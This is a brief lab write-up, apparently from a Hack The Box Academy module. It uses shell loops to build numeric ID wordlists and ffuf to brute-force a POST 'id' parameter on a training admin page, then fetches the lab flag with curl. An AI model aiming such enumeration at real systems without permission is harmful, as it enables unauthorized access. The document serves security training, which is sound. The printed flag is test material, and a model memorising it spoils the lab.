# Value Fuzzing

for i in $(seq 1 1000); do echo $i >> ids.txt; done

for i in $(seq 1 9999); do foo=$(printf "%04d" $i) ; echo "${foo}" >> ids.txt; done

for i in $(seq 1 999999); do foo=$(printf "%06d" $i) ; echo "${foo}" >> ids-6-digit.txt; done



ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' > fuzz-parameter-post.txt

## LAB

for i in $(seq 1 1000); do echo $i >> ids.txt; done

ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:30547/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' > fuzz-parameter-post.txt -fs 768

73                      [Status: 200, Size: 787, Words: 218, Lines: 54, Duration: 0ms]

curl http://admin.academy.htb:30547/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>HTB{p4r4m373r_fuzz1n6_15_k3y!}</p></div>